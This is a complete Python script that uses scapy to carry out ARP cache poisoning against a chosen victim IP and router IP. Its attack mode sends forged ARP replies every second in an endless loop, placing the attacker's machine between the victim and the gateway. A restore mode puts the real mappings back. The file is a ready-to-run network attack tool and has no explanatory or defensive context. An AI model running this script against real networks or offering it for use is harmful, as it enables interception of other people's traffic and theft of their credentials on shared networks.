#!/usr/bin/env python
#-*-coding:UTF-8-*-

from scapy.all import *
import os,sys,threading,signal,argparse


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-v", "--victimIP", help="Choose the victim IP address. Example: -v 192.168.0.5")
    parser.add_argument("-r", "--routerIP", help="Choose the router IP address. Example: -r 192.168.0.1")
    parser.add_argument("-t", "--type", help="Select attack or restore ")
    return parser.parse_args()

def poison_target(gwIp,targetIp,gwHw,targetHw,attackHw):
    send(ARP(op=2, pdst=targetIp,psrc=gwIp, hwdst=targetHw,hwsrc=attackHw))
    send(ARP(op=2, pdst=gwIp,psrc=targetIp, hwdst=gwHw,hwsrc=attackHw))

def restore(gwIp,targetIp,gwHw,targetHw):
    send(ARP(op=2, pdst=targetIp,psrc=gwIp, hwdst=targetHw,hwsrc=gwHw), count=3)
    send(ARP(op=2, pdst=gwIp,psrc=targetIp, hwdst=gwHw,hwsrc=targetHw), count=3)

def getAttackerMAC(routerIP):
    return (Ether()/IP(dst=routerIP))[Ether].src
def originalMAC(ip):
    return sr1(ARP(pdst=ip,op=1), timeout=5, retry=3)[ARP].hwsrc

args=parse_args()
routerIP = args.routerIP
victimIP = args.victimIP
attackerMAC = getAttackerMAC(routerIP)
routerMAC = originalMAC(args.routerIP)
victimMAC = originalMAC(args.victimIP)
while 1:
    if args.type == "attack":
        try:
            poison_target(routerIP,victimIP,routerMAC,victimMAC,attackerMAC)
            time.sleep(1)
        except KeyboardInterrupt:
            sys.exit("Fin du cache Poisonning")
    elif args.type == "restore":
        try:
            restore(routerIP,victimIP,routerMAC,victimMAC)
        except KeyboardInterrupt:
            sys.exit("Fin du restore")
    else:
        sys.exit("Error")
